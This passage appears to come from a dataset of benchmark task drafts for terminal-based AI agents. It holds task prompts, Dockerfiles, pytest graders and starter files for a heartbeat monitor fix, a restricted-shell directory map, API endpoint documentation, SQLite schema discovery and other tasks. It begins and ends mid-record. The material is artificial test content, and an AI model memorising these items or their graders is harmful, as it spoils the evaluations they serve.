diagram\""\""\""\n        fig, axes = plt.subplots(len(self.intersections), 1, figsize=(12, 2*len(self.intersections)))\n        if len(self.intersections) == 1:\n            axes = [axes]\n        \n        for idx, light in enumerate(self.intersections):\n            ax = axes[idx]\n            times = list(range(duration))\n            states = [light.get_state_at_time(t) for t in times]\n            \n            # Create color mapping\n            colors = []\n            for state in states:\n                if state == \""green\"":\n                    colors.append(\""green\"")\n                elif state == \""yellow\"":\n                    colors.append(\""yellow\"")\n                else:\n                    colors.append(\""red\"")\n            \n            # Plot as horizontal bars\n            for i, (t, color) in enumerate(zip(times, colors)):\n                ax.barh(0, 1, left=t, height=0.8, color=color, edgecolor='none')\n            \n            ax.set_ylim(-0.5, 0.5)\n            ax.set_xlim(0, duration)\n            ax.set_ylabel(light.id)\n            ax.set_yticks([])\n            \n            if idx == len(self.intersections) - 1:\n                ax.set_xlabel(\""Time (seconds)\"")\n        \n        plt.tight_layout()\n        plt.savefig(\""timing_diagram.png\"")\n        plt.close()"", ""analyze_traffic.py"": ""#!/usr/bin/env python3\n\nfrom traffic_sync import TrafficSynchronizer\n\ndef main():\n    # Initialize the synchronizer\n    sync = TrafficSynchronizer()\n    \n    # Load intersection data\n    sync.load_intersections(\""intersections.csv\"")\n    \n    # Calculate current max all-red duration\n    current_max = sync.calculate_max_all_red_duration()\n    print(f\""Current maximum all-red duration: {current_max} seconds\"")\n    \n    # Try to optimize\n    sync.optimize_phase_offsets()\n    \n    # Calculate after optimization\n    optimized_max = sync.calculate_max_all_red_duration()\n    print(f\""Optimized maximum all-red duration: {optimized_max} seconds\"")\n    \n    # Write result to file\n    with open(\""traffic_analysis.txt\"", \""w\"") as f:\n        f.write(str(optimized_max))\n    \n    # Create visualization\n    sync.visualize_timing()\n    print(\""Timing diagram saved to timing_diagram.png\"")\n\nif __name__ == \""__main__\"":\n    main()"", ""intersections.csv"": ""intersection_id,green_time,yellow_time,red_time\nMain_1st,35,5,20\nMain_2nd,40,4,26\nMain_3rd,30,5,25\nMain_4th,45,3,32""}",2025-07-21T09:43:30.844721,2025-07-22T11:01:14.084764+00:00
draft_dp_79903286,medium,draft_dp_79903286,debugging,The heartbeat monitor is triggering false alerts during natural gaps between service heartbeats. Fix it to calculate the correct maximum expected gap and only alert when that's exceeded.,debugging,python|synchronization|algorithms,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /monitoring

# Copy the monitoring system files
COPY services_config.json /monitoring/
COPY monitor.py /monitoring/
COPY run_monitor.py /monitoring/

# Create logs directory
RUN mkdir -p /monitoring/logs

CMD [""bash""]","import subprocess
import os
import json
import math

def test_max_gap_calculation():
    """"""Test that the monitor correctly calculates the maximum expected gap between heartbeats.""""""
    # Run the monitor to calculate and save the max gap
    result = subprocess.run(['python', '/monitoring/run_monitor.py'], 
                          capture_output=True, text=True, cwd='/monitoring')
    
    # Check the calculated max gap value
    with open('/monitoring/monitoring_config.txt', 'r') as f:
        calculated_gap = int(f.read().strip())
    
    # Load the service config to verify calculation
    with open('/monitoring/services_config.json', 'r') as f:
        config = json.load(f)
    
    intervals = [s['heartbeat_interval'] for s in config['services']]
    
    # The maximum guaranteed gap occurs just before all services align
    # For intervals [15, 20, 25, 30], the LCM is 300
    # The max gap should be calculated properly (not just use the threshold)
    # In this case, it should be greater than the naive threshold of 10
    
    # Basic check: the calculated gap should be reasonable
    assert calculated_gap > max(intervals), f""Max gap {calculated_gap} should be greater than largest interval {max(intervals)}""
    assert calculated_gap < sum(intervals), f""Max gap {calculated_gap} should be less than sum of all intervals""
    
    return True

def test_no_false_alerts():
    """"""Test that the monitor doesn't trigger false alerts during natural gaps.""""""
    # This test would fail initially because the current implementation
    # uses a hardcoded threshold instead of calculating the real max gap
    
    # Check that monitoring_config.txt exists and has a reasonable value
    assert os.path.exists('/monitoring/monitoring_config.txt'), ""monitoring_config.txt should exist""
    
    with open('/monitoring/monitoring_config.txt', 'r') as f:
        max_gap = int(f.read().strip())
    
    # The properly calculated max gap for intervals [15, 20, 25, 30]
    # should handle the natural gaps without false alerts
    # Current implementation returns 10 which is too low
    assert max_gap >= 15, f""Max gap {max_gap} is too low to prevent false alerts""
    
    return True","{""test_max_gap_calculation"": 0.6, ""test_no_false_alerts"": 0.4}","{""monitor.py"": ""import json\nimport time\nimport logging\nfrom datetime import datetime, timedelta\nfrom typing import Dict, List, Optional\n\nlogging.basicConfig(\n    level=logging.INFO,\n    format='%(asctime)s - %(levelname)s - %(message)s',\n    handlers=[\n        logging.FileHandler('/monitoring/logs/monitor.log'),\n        logging.StreamHandler()\n    ]\n)\n\nclass HeartbeatMonitor:\n    def __init__(self, config_file: str):\n        self.config_file = config_file\n        self.services = {}\n        self.alert_threshold = None\n        self.last_heartbeats = {}\n        self.load_config()\n        \n    def load_config(self):\n        with open(self.config_file, 'r') as f:\n            config = json.load(f)\n        \n        self.services = {s['name']: s['heartbeat_interval'] for s in config['services']}\n        self.alert_threshold = config['alert_threshold']\n        \n        for service_name in self.services:\n            self.last_heartbeats[service_name] = datetime.now()\n            \n        logging.info(f\""Loaded config: {len(self.services)} services, alert threshold: {self.alert_threshold}s\"")\n        \n    def calculate_max_expected_gap(self) -> int:\n        \""\""\""Calculate the maximum expected gap between any heartbeats.\n        \n        Current implementation is broken - just uses the hardcoded alert_threshold.\n        \""\""\""\n        return self.alert_threshold\n    \n    def receive_heartbeat(self, service_name: str):\n        if service_name in self.services:\n            self.last_heartbeats[service_name] = datetime.now()\n            logging.debug(f\""Heartbeat received from {service_name}\"")\n            \n    def check_for_failures(self) -> List[str]:\n        \""\""\""Check if any service has exceeded the alert threshold.\""\""\""\n        failed_services = []\n        current_time = datetime.now()\n        max_gap = self.calculate_max_expected_gap()\n        \n        for service_name, last_heartbeat in self.last_heartbeats.items():\n            time_since_heartbeat = (current_time - last_heartbeat).total_seconds()\n            \n            if time_since_heartbeat > max_gap:\n                failed_services.append(service_name)\n                logging.warning(f\""Service {service_name} hasn't sent heartbeat for {time_since_heartbeat:.1f}s (threshold: {max_gap}s)\"")\n                \n        return failed_services\n    \n    def save_max_gap_config(self):\n        \""\""\""Save the calculated maximum expected gap to monitoring_config.txt\""\""\""\n        max_gap = self.calculate_max_expected_gap()\n        with open('/monitoring/monitoring_config.txt', 'w') as f:\n            f.write(str(max_gap))\n        logging.info(f\""Saved max expected gap: {max_gap}s to monitoring_config.txt\"")\n        \n    def simulate_heartbeats(self, duration: int = 120):\n        \""\""\""Simulate heartbeats for testing.\""\""\""\n        import threading\n        \n        def send_heartbeats(service_name: str, interval: int):\n            while True:\n                time.sleep(interval)\n                self.receive_heartbeat(service_name)\n                \n        threads = []\n        for service_name, interval in self.services.items():\n            t = threading.Thread(target=send_heartbeats, args=(service_name, interval), daemon=True)\n            t.start()\n            threads.append(t)\n            \n        start_time = time.time()\n        while time.time() - start_time < duration:\n            time.sleep(5)\n            failures = self.check_for_failures()\n            if failures:\n                logging.error(f\""ALERT: Services failed: {failures}\"")"", ""run_monitor.py"": ""#!/usr/bin/env python3\nfrom monitor import HeartbeatMonitor\nimport sys\n\nif __name__ == \""__main__\"":\n    monitor = HeartbeatMonitor('/monitoring/services_config.json')\n    \n    if len(sys.argv) > 1 and sys.argv[1] == \""simulate\"":\n        print(\""Starting heartbeat simulation...\"")\n        monitor.simulate_heartbeats(duration=60)\n    else:\n        monitor.save_max_gap_config()\n        print(f\""Maximum expected gap calculated and saved to monitoring_config.txt\"")"", ""services_config.json"": ""{\n  \""services\"": [\n    {\n      \""name\"": \""auth-service\"",\n      \""heartbeat_interval\"": 15\n    },\n    {\n      \""name\"": \""payment-service\"", \n      \""heartbeat_interval\"": 20\n    },\n    {\n      \""name\"": \""user-service\"",\n      \""heartbeat_interval\"": 25\n    },\n    {\n      \""name\"": \""inventory-service\"",\n      \""heartbeat_interval\"": 30\n    }\n  ],\n  \""alert_threshold\"": 10\n}""}",2025-07-21T09:51:51.924163,2025-07-21T09:51:51.924163
draft_dp_f2648c76,medium,draft_dp_f2648c76,system-administration,"The recovery shell only has cd, pwd, and probe commands. Need to map out the entire directory structure starting from / and save it to /recovery/directory_map.txt.",system-administration,file-operations|cli|automation,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /

# Create directory structure for recovery scenario
RUN mkdir -p /recovery /project/src/main /project/src/utils /project/src/models \
    /project/tests/unit /project/tests/integration \
    /project/docs/api /project/docs/guides \
    /project/config/dev /project/config/prod \
    /project/lib/external /project/lib/internal \
    /project/build/debug /project/build/release \
    /project/scripts/deploy /project/scripts/setup \
    /project/data/raw /project/data/processed

# Copy the recovery shell script
COPY recovery_shell.sh /usr/local/bin/recovery_shell
RUN chmod +x /usr/local/bin/recovery_shell

# Set the recovery shell as the default shell
ENV SHELL=/usr/local/bin/recovery_shell

WORKDIR /recovery","import os
import subprocess

def test_directory_map_created():
    """"""Test that the directory map file exists and contains all expected directories""""""
    # Check if the output file exists - this should fail initially
    assert os.path.exists(""/recovery/directory_map.txt""), ""Directory map file not found""
    
    # Read the generated map
    with open(""/recovery/directory_map.txt"", ""r"") as f:
        content = f.read()
    
    # List of all directories that should be discovered
    expected_dirs = [
        ""/project"", ""/recovery"",
        ""/project/src"", ""/project/src/main"", ""/project/src/utils"", ""/project/src/models"",
        ""/project/tests"", ""/project/tests/unit"", ""/project/tests/integration"",
        ""/project/docs"", ""/project/docs/api"", ""/project/docs/guides"",
        ""/project/config"", ""/project/config/dev"", ""/project/config/prod"",
        ""/project/lib"", ""/project/lib/external"", ""/project/lib/internal"",
        ""/project/build"", ""/project/build/debug"", ""/project/build/release"",
        ""/project/scripts"", ""/project/scripts/deploy"", ""/project/scripts/setup"",
        ""/project/data"", ""/project/data/raw"", ""/project/data/processed""
    ]
    
    # Check that all directories are mentioned in the output
    missing_dirs = []
    for dir_path in expected_dirs:
        # Remove leading slash for flexibility in checking
        dir_name = dir_path.strip(""/"")
        if dir_name and dir_name not in content:
            missing_dirs.append(dir_path)
    
    assert len(missing_dirs) == 0, f""Missing directories: {missing_dirs}""
    return True

def test_directory_structure_correct():
    """"""Test that the directory map correctly represents parent-child relationships""""""
    assert os.path.exists(""/recovery/directory_map.txt""), ""Directory map file not found""
    
    with open(""/recovery/directory_map.txt"", ""r"") as f:
        content = f.read()
    
    # Check a few key parent-child relationships
    # The exact format doesn't matter as long as the hierarchy is clear
    checks = [
        # Parent ""src"" should appear before its children ""main"", ""utils"", ""models""
        (""src"", [""main"", ""utils"", ""models""]),
        (""tests"", [""unit"", ""integration""]),
        (""docs"", [""api"", ""guides""]),
        (""config"", [""dev"", ""prod""])
    ]
    
    for parent, children in checks:
        # Find where parent appears
        parent_pos = content.find(parent)
        assert parent_pos != -1, f""Parent directory '{parent}' not found in map""
        
        # Check that all children appear after parent and are associated
        for child in children:
            child_pos = content.find(child)
            assert child_pos != -1, f""Child directory '{child}' not found in map""
            assert child_pos > parent_pos, f""Child '{child}' should appear after parent '{parent}'""
    
    return True","{""test_directory_map_created"": 0.6, ""test_directory_structure_correct"": 0.4}","{""recovery_shell.sh"": ""#!/bin/bash\n\ncurrent_dir=\""/\""\n\necho \""Recovery shell started. Available commands: cd, pwd, probe\""\necho \""Type 'exit' to quit.\""\n\nwhile true; do\n    read -p \""recovery> \"" cmd args\n    \n    case \""$cmd\"" in\n        pwd)\n            echo \""$current_dir\""\n            ;;\n        cd)\n            if [ -z \""$args\"" ]; then\n                current_dir=\""/\""\n            elif [ \""$args\"" = \""..\"" ]; then\n                if [ \""$current_dir\"" != \""/\"" ]; then\n                    current_dir=$(dirname \""$current_dir\"")\n                fi\n            elif [ \""$args\"" = \""/\"" ]; then\n                current_dir=\""/\""\n            elif [[ \""$args\"" == /* ]]; then\n                # Absolute path\n                if [ -d \""$args\"" ]; then\n                    current_dir=\""$args\""\n                else\n                    echo \""cd: $args: Permission denied\""\n                fi\n            else\n                # Relative path\n                new_path=\""${current_dir%/}/$args\""\n                if [ -d \""$new_path\"" ]; then\n                    current_dir=\""$new_path\""\n                else\n                    echo \""cd: $args: Permission denied\""\n                fi\n            fi\n            ;;\n        probe)\n            if [ -d \""$current_dir\"" ]; then\n                subdirs=$(find \""$current_dir\"" -maxdepth 1 -type d ! -path \""$current_dir\"" -printf \""%f\\n\"" | sort)\n                if [ -z \""$subdirs\"" ]; then\n                    echo \""No subdirectories found.\""\n                else\n                    echo \""$subdirs\""\n                fi\n            fi\n            ;;\n        exit)\n            exit 0\n            ;;\n        *)\n            echo \""Unknown command: $cmd\""\n            echo \""Available commands: cd, pwd, probe\""\n            ;;\n    esac\ndone""}",2025-07-21T09:51:42.847822,2025-07-21T09:53:37.250169
draft_dp_336f04d9,hard,draft_dp_336f04d9,software-engineering,"The API on localhost:8000 has no docs. Map out all endpoints and create an api_spec.json file documenting every endpoint's method, path, parameters, and responses.",software-engineering,api|python|web,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install build dependencies for pydantic-core
RUN apt-get update && apt-get install -y \
    build-essential \
    gcc \
    g++ \
    && rm -rf /var/lib/apt/lists/*

COPY requirements.txt /app/
RUN pip install -r requirements.txt

COPY app.py /app/
COPY start_server.sh /app/
RUN chmod +x /app/start_server.sh

EXPOSE 8000

RUN /app/start_server.sh","import subprocess
import json
import os

def test_api_spec_created():
    """"""Test that api_spec.json file was created with valid content""""""
    spec_path = ""/app/api_spec.json""
    
    # Check file exists
    assert os.path.exists(spec_path), ""api_spec.json file not found""
    
    # Load and validate JSON
    with open(spec_path, 'r') as f:
        spec = json.load(f)
    
    # Check basic structure
    assert ""endpoints"" in spec, ""Missing 'endpoints' key in spec""
    assert isinstance(spec[""endpoints""], list), ""endpoints should be a list""
    assert len(spec[""endpoints""]) > 0, ""No endpoints documented""
    
    # Check first endpoint has required fields
    endpoint = spec[""endpoints""][0]
    required_fields = [""path"", ""method"", ""description""]
    for field in required_fields:
        assert field in endpoint, f""Missing required field '{field}' in endpoint""

def test_spec_completeness():
    """"""Test that the spec documents at least 12 endpoints (80% of ~15)""""""
    spec_path = ""/app/api_spec.json""
    
    with open(spec_path, 'r') as f:
        spec = json.load(f)
    
    endpoint_count = len(spec[""endpoints""])
    assert endpoint_count >= 12, f""Only {endpoint_count} endpoints documented, need at least 12""
    
    # Check variety of HTTP methods documented
    methods = {ep[""method""] for ep in spec[""endpoints""]}
    assert len(methods) >= 3, f""Only {len(methods)} HTTP methods documented, need variety""","{""test_api_spec_created"": 0.4, ""test_spec_completeness"": 0.6}","{""requirements.txt"": ""fastapi==0.104.1\nuvicorn==0.24.0"", ""start_server.sh"": ""#!/bin/bash\npython -m uvicorn app:app --host 0.0.0.0 --port 8000 > /tmp/server.log 2>&1 &\necho \""Server starting on localhost:8000...\""\nsleep 2"", ""app.py"": ""from fastapi import FastAPI, HTTPException, Query, Header, Body, Depends\nfrom typing import List, Optional, Dict, Any\nfrom datetime import datetime\nimport uuid\n\napp = FastAPI()\n\n# Data storage\nusers = {}\nprojects = {}\ntasks = {}\ncomments = {}\n\n# Auth dependency\nasync def verify_api_key(x_api_key: str = Header(None)):\n    if x_api_key != \""secret-key-123\"":\n        raise HTTPException(status_code=401, detail=\""Invalid API key\"")\n    return True\n\n# Root endpoint\n@app.get(\""/\"")\ndef read_root():\n    return {\""message\"": \""Project Management API v1.0\"", \""status\"": \""running\""}\n\n# Health check\n@app.get(\""/health\"")\ndef health_check():\n    return {\""status\"": \""healthy\"", \""timestamp\"": datetime.now().isoformat()}\n\n# User endpoints\n@app.get(\""/users\"")\ndef list_users(limit: int = Query(10, ge=1, le=100), offset: int = Query(0, ge=0)):\n    user_list = list(users.values())\n    return {\""users\"": user_list[offset:offset+limit], \""total\"": len(users)}\n\n@app.post(\""/users\"")\ndef create_user(data: Dict[str, Any]):\n    if \""name\"" not in data or \""email\"" not in data:\n        raise HTTPException(status_code=400, detail=\""Name and email required\"")\n    \n    user_id = str(uuid.uuid4())\n    user_data = {\n        \""id\"": user_id,\n        \""name\"": data[\""name\""],\n        \""email\"": data[\""email\""],\n        \""role\"": data.get(\""role\"", \""member\""),\n        \""created_at\"": datetime.now().isoformat()\n    }\n    users[user_id] = user_data\n    return user_data\n\n@app.get(\""/users/{user_id}\"")\ndef get_user(user_id: str):\n    if user_id not in users:\n        raise HTTPException(status_code=404, detail=\""User not found\"")\n    return users[user_id]\n\n@app.put(\""/users/{user_id}\"")\ndef update_user(user_id: str, data: Dict[str, Any]):\n    if user_id not in users:\n        raise HTTPException(status_code=404, detail=\""User not found\"")\n    \n    users[user_id].update({\n        \""name\"": data.get(\""name\"", users[user_id][\""name\""]),\n        \""email\"": data.get(\""email\"", users[user_id][\""email\""]),\n        \""role\"": data.get(\""role\"", users[user_id][\""role\""])\n    })\n    return users[user_id]\n\n@app.delete(\""/users/{user_id}\"")\ndef delete_user(user_id: str):\n    if user_id not in users:\n        raise HTTPException(status_code=404, detail=\""User not found\"")\n    deleted_user = users.pop(user_id)\n    return {\""message\"": \""User deleted\"", \""user\"": deleted_user}\n\n# Project endpoints\n@app.get(\""/projects\"")\ndef list_projects(owner_id: Optional[str] = Query(None)):\n    project_list = list(projects.values())\n    if owner_id:\n        project_list = [p for p in project_list if p[\""owner_id\""] == owner_id]\n    return {\""projects\"": project_list, \""total\"": len(project_list)}\n\n@app.post(\""/projects\"", dependencies=[Depends(verify_api_key)])\ndef create_project(data: Dict[str, Any]):\n    if \""name\"" not in data or \""description\"" not in data or \""owner_id\"" not in data:\n        raise HTTPException(status_code=400, detail=\""Name, description, and owner_id required\"")\n        \n    if data[\""owner_id\""] not in users:\n        raise HTTPException(status_code=400, detail=\""Owner user does not exist\"")\n    \n    project_id = str(uuid.uuid4())\n    project_data = {\n        \""id\"": project_id,\n        \""name\"": data[\""name\""],\n        \""description\"": data[\""description\""],\n        \""owner_id\"": data[\""owner_id\""],\n        \""created_at\"": datetime.now().isoformat()\n    }\n    projects[project_id] = project_data\n    return project_data\n\n@app.get(\""/projects/{project_id}\"")\ndef get_project(project_id: str):\n    if project_id not in projects:\n        raise HTTPException(status_code=404, detail=\""Project not found\"")\n    return projects[project_id]\n\n@app.put(\""/projects/{project_id}\"", dependencies=[Depends(verify_api_key)])\ndef update_project(project_id: str, data: Dict[str, Any]):\n    if project_id not in projects:\n        raise HTTPException(status_code=404, detail=\""Project not found\"")\n    \n    projects[project_id].update({\n        \""name\"": data.get(\""name\"", projects[project_id][\""name\""]),\n        \""description\"": data.get(\""description\"", projects[project_id][\""description\""]),\n        \""owner_id\"": data.get(\""owner_id\"", projects[project_id][\""owner_id\""])\n    })\n    return projects[project_id]\n\n@app.delete(\""/projects/{project_id}\"", dependencies=[Depends(verify_api_key)])\ndef delete_project(project_id: str):\n    if project_id not in projects:\n        raise HTTPException(status_code=404, detail=\""Project not found\"")\n    deleted_project = projects.pop(project_id)\n    return {\""message\"": \""Project deleted\"", \""project\"": deleted_project}\n\n# Task endpoints\n@app.get(\""/tasks\"")\ndef list_tasks(project_id: Optional[str] = Query(None), status: Optional[str] = Query(None)):\n    task_list = list(tasks.values())\n    if project_id:\n        task_list = [t for t in task_list if t[\""project_id\""] == project_id]\n    if status:\n        task_list = [t for t in task_list if t[\""status\""] == status]\n    return {\""tasks\"": task_list, \""total\"": len(task_list)}\n\n@app.post(\""/tasks\"")\ndef create_task(data: Dict[str, Any]):\n    if \""title\"" not in data or \""description\"" not in data or \""project_id\"" not in data:\n        raise HTTPException(status_code=400, detail=\""Title, description, and project_id required\"")\n        \n    if data[\""project_id\""] not in projects:\n        raise HTTPException(status_code=400, detail=\""Project does not exist\"")\n    if data.get(\""assignee_id\"") and data[\""assignee_id\""] not in users:\n        raise HTTPException(status_code=400, detail=\""Assignee user does not exist\"")\n    \n    task_id = str(uuid.uuid4())\n    task_data = {\n        \""id\"": task_id,\n        \""title\"": data[\""title\""],\n        \""description\"": data[\""description\""],\n        \""project_id\"": data[\""project_id\""],\n        \""assignee_id\"": data.get(\""assignee_id\""),\n        \""status\"": data.get(\""status\"", \""todo\""),\n        \""created_at\"": datetime.now().isoformat()\n    }\n    tasks[task_id] = task_data\n    return task_data\n\n@app.get(\""/tasks/{task_id}\"")\ndef get_task(task_id: str):\n    if task_id not in tasks:\n        raise HTTPException(status_code=404, detail=\""Task not found\"")\n    return tasks[task_id]\n\n@app.patch(\""/tasks/{task_id}/status\"")\ndef update_task_status(task_id: str, status: str = Body(..., embed=True)):\n    if task_id not in tasks:\n        raise HTTPException(status_code=404, detail=\""Task not found\"")\n    if status not in [\""todo\"", \""in_progress\"", \""done\""]:\n        raise HTTPException(status_code=400, detail=\""Invalid status\"")\n    \n    tasks[task_id][\""status\""] = status\n    return tasks[task_id]\n\n# Comment endpoints\n@app.get(\""/tasks/{task_id}/comments\"")\ndef list_task_comments(task_id: str):\n    if task_id not in tasks:\n        raise HTTPException(status_code=404, detail=\""Task not found\"")\n    \n    task_comments = [c for c in comments.values() if c[\""task_id\""] == task_id]\n    return {\""comments\"": task_comments, \""total\"": len(task_comments)}\n\n@app.post(\""/comments\"")\ndef create_comment(data: Dict[str, Any]):\n    if \""content\"" not in data or \""task_id\"" not in data or \""author_id\"" not in data:\n        raise HTTPException(status_code=400, detail=\""Content, task_id, and author_id required\"")\n        \n    if data[\""task_id\""] not in tasks:\n        raise HTTPException(status_code=400, detail=\""Task does not exist\"")\n    if data[\""author_id\""] not in users:\n        raise HTTPException(status_code=400, detail=\""Author user does not exist\"")\n    \n    comment_id = str(uuid.uuid4())\n    comment_data = {\n        \""id\"": comment_id,\n        \""content\"": data[\""content\""],\n        \""task_id\"": data[\""task_id\""],\n        \""author_id\"": data[\""author_id\""],\n        \""created_at\"": datetime.now().isoformat()\n    }\n    comments[comment_id] = comment_data\n    return comment_data\n\n# Search endpoint\n@app.get(\""/search\"")\ndef search(q: str = Query(..., min_length=1)):\n    results = {\n        \""users\"": [],\n        \""projects\"": [],\n        \""tasks\"": []\n    }\n    \n    q_lower = q.lower()\n    \n    for user in users.values():\n        if q_lower in user[\""name\""].lower() or q_lower in user[\""email\""].lower():\n            results[\""users\""].append(user)\n    \n    for project in projects.values():\n        if q_lower in project[\""name\""].lower() or q_lower in project[\""description\""].lower():\n            results[\""projects\""].append(project)\n    \n    for task in tasks.values():\n        if q_lower in task[\""title\""].lower() or q_lower in task[\""description\""].lower():\n            results[\""tasks\""].append(task)\n    \n    return results\n\nif __name__ == \""__main__\"":\n    import uvicorn\n    uvicorn.run(app, host=\""0.0.0.0\"", port=8000)""}",2025-07-21T09:45:15.075052,2025-07-21T09:52:34.467160
draft_dp_a72865cd,medium,draft_dp_a72865cd,data-processing,"The legacy.db database has no documentation. Write a schema discovery tool that finds all tables, columns, and relationships.",data-processing,python|data-extraction|cli,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /workspace

# Copy the database setup script
COPY setup_database.py /workspace/

# Setup the legacy database
RUN python setup_database.py

# Clean up setup script
RUN rm setup_database.py

CMD [""bash""]","import subprocess
import json
import os

def test_discovers_all_tables():
    """"""Test that the schema discovery tool finds all 6 tables including hidden _audit_log""""""
    # Look for any Python script that appears to be the schema discovery tool
    python_files = []
    for root, dirs, files in os.walk('/workspace'):
        for file in files:
            if file.endswith('.py') and 'schema' in file.lower():
                python_files.append(os.path.join(root, file))
    
    if not python_files:
        # Try generic names
        for name in ['discover.py', 'schema.py', 'analyze.py', 'tool.py']:
            if os.path.exists(f'/workspace/{name}'):
                python_files.append(f'/workspace/{name}')
    
    assert len(python_files) > 0, ""No schema discovery tool found""
    
    # Run the tool and check output
    result = subprocess.run(['python', python_files[0]], capture_output=True, text=True, cwd='/workspace')
    output = result.stdout.lower()
    
    # Check that all tables are discovered
    expected_tables = ['customers', 'products', 'orders', 'order_items', 'customer_addresses', '_audit_log']
    found_tables = sum(1 for table in expected_tables if table in output)
    
    assert found_tables == 6, f""Expected to find all 6 tables, but only found {found_tables}""

def test_identifies_relationships():
    """"""Test that the tool identifies both explicit foreign keys and implicit relationships""""""
    # Look for the schema discovery tool
    python_files = []
    for root, dirs, files in os.walk('/workspace'):
        for file in files:
            if file.endswith('.py') and 'schema' in file.lower():
                python_files.append(os.path.join(root, file))
    
    if not python_files:
        for name in ['discover.py', 'schema.py', 'analyze.py', 'tool.py']:
            if os.path.exists(f'/workspace/{name}'):
                python_files.append(f'/workspace/{name}')
    
    assert len(python_files) > 0, ""No schema discovery tool found""
    
    result = subprocess.run(['python', python_files[0]], capture_output=True, text=True, cwd='/workspace')
    output = result.stdout.lower()
    
    # Check for explicit foreign key relationships
    explicit_fks = [
        ('orders', 'customer_id', 'customers'),
        ('order_items', 'order_id', 'orders'),
        ('order_items', 'product_id', 'products')
    ]
    
    # Check for implicit relationship (customer_addresses.customer_id -> customers.id)
    implicit_relationship = ('customer_addresses', 'customer_id', 'customers')
    
    # Count found relationships
    found_explicit = 0
    for table, column, ref_table in explicit_fks:
        if table in output and column in output and ref_table in output:
            # Basic check that these appear related in output
            found_explicit += 1
    
    # Check implicit relationship is discovered
    implicit_found = all(term in output for term in implicit_relationship)
    
    assert found_explicit >= 2, f""Expected at least 2 explicit FK relationships, found indicators for {found_explicit}""
    assert implicit_found, ""Failed to identify implicit relationship between customer_addresses and customers""","{""test_discovers_all_tables"": 0.5, ""test_identifies_relationships"": 0.5}","{""setup_database.py"": ""#!/usr/bin/env python3\nimport sqlite3\nimport os\n\n# Create the legacy database\ndb_path = '/tmp/legacy.db'\nif os.path.exists(db_path):\n    os.remove(db_path)\n\nconn = sqlite3.connect(db_path)\nconn.execute(\""PRAGMA foreign_keys = ON\"")\ncur = conn.cursor()\n\n# Create main tables\ncur.execute(\""\""\""\nCREATE TABLE customers (\n    id INTEGER PRIMARY KEY,\n    email TEXT UNIQUE NOT NULL,\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n)\n\""\""\"")\n\ncur.execute(\""\""\""\nCREATE TABLE products (\n    id INTEGER PRIMARY KEY,\n    sku TEXT UNIQUE NOT NULL,\n    name TEXT NOT NULL,\n    price DECIMAL(10,2) NOT NULL CHECK(price >= 0)\n)\n\""\""\"")\n\ncur.execute(\""\""\""\nCREATE TABLE orders (\n    id INTEGER PRIMARY KEY,\n    customer_id INTEGER NOT NULL,\n    order_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n    total DECIMAL(10,2),\n    FOREIGN KEY (customer_id) REFERENCES customers(id)\n)\n\""\""\"")\n\ncur.execute(\""\""\""\nCREATE TABLE order_items (\n    id INTEGER PRIMARY KEY,\n    order_id INTEGER NOT NULL,\n    product_id INTEGER NOT NULL,\n    quantity INTEGER NOT NULL CHECK(quantity > 0),\n    unit_price DECIMAL(10,2) NOT NULL,\n    FOREIGN KEY (order_id) REFERENCES orders(id),\n    FOREIGN KEY (product_id) REFERENCES products(id)\n)\n\""\""\"")\n\n# Create a table with implicit relationship (no foreign key, but follows naming pattern)\ncur.execute(\""\""\""\nCREATE TABLE customer_addresses (\n    id INTEGER PRIMARY KEY,\n    customer_id INTEGER NOT NULL,\n    address_line1 TEXT NOT NULL,\n    city TEXT NOT NULL,\n    postal_code TEXT\n)\n\""\""\"")\n\n# Create a \""hidden\"" table by using a system-like name\ncur.execute(\""\""\""\nCREATE TABLE _audit_log (\n    id INTEGER PRIMARY KEY,\n    table_name TEXT NOT NULL,\n    record_id INTEGER NOT NULL,\n    action TEXT NOT NULL,\n    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n)\n\""\""\"")\n\n# Create a view\ncur.execute(\""\""\""\nCREATE VIEW order_summary AS\nSELECT \n    o.id as order_id,\n    c.email as customer_email,\n    o.order_date,\n    COUNT(oi.id) as item_count,\n    o.total\nFROM orders o\nJOIN customers c ON o.customer_id = c.id\nLEFT JOIN order_items oi ON o.id = oi.order_id\nGROUP BY o.id\n\""\""\"")\n\n# Create an index\ncur.execute(\""CREATE INDEX idx_orders_customer ON orders(customer_id)\"")\ncur.execute(\""CREATE INDEX idx_order_items_order ON order_items(order_id)\"")\n\n# Create a trigger\ncur.execute(\""\""\""\nCREATE TRIGGER update_order_total\nAFTER INSERT ON order_items\nBEGIN\n    UPDATE orders \n    SET total = (\n        SELECT SUM(quantity * unit_price) \n        FROM order_items \n        WHERE order_id = NEW.order_id\n    )\n    WHERE id = NEW.order_id;\nEND\n\""\""\"")\n\n# Insert some sample data\ncur.execute(\""INSERT INTO customers (email) VALUES ('john@example.com')\"")\ncur.execute(\""INSERT INTO customers (email) VALUES ('jane@example.com')\"")\n\ncur.execute(\""INSERT INTO products (sku, name, price) VALUES ('SKU001', 'Widget', 19.99)\"")\ncur.execute(\""INSERT INTO products (sku, name, price) VALUES ('SKU002', 'Gadget', 29.99)\"")\n\ncur.execute(\""INSERT INTO orders (customer_id) VALUES (1)\"")\ncur.execute(\""INSERT INTO order_items (order_id, product_id, quantity, unit_price) VALUES (1, 1, 2, 19.99)\"")\n\ncur.execute(\""INSERT INTO customer_addresses (customer_id, address_line1, city, postal_code) VALUES (1, '123 Main St', 'Anytown', '12345')\"")\n\ncur.execute(\""INSERT INTO _audit_log (table_name, record_id, action) VALUES ('orders', 1, 'INSERT')\"")\n\nconn.commit()\nconn.close()\n\nprint(\""Database created at /tmp/legacy.db\"")""}",2025-07-21T10:03:18.036704,2025-07-21T10:03:18.036704
draft_dp_5a12fc8f,medium,draft_dp_5a12fc8f,machine-learning,The attention module is using standard position embeddings but we need ALiBi for longer sequences. Update it to use ALiBi biases instead - should handle up to 8k tokens efficiently.,machine-learning,python|pytorch|algorithm-implementation,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /workspace

# Only install minimal packages needed
RUN pip install --no-cache-dir numpy einops

COPY attention.py /workspace/
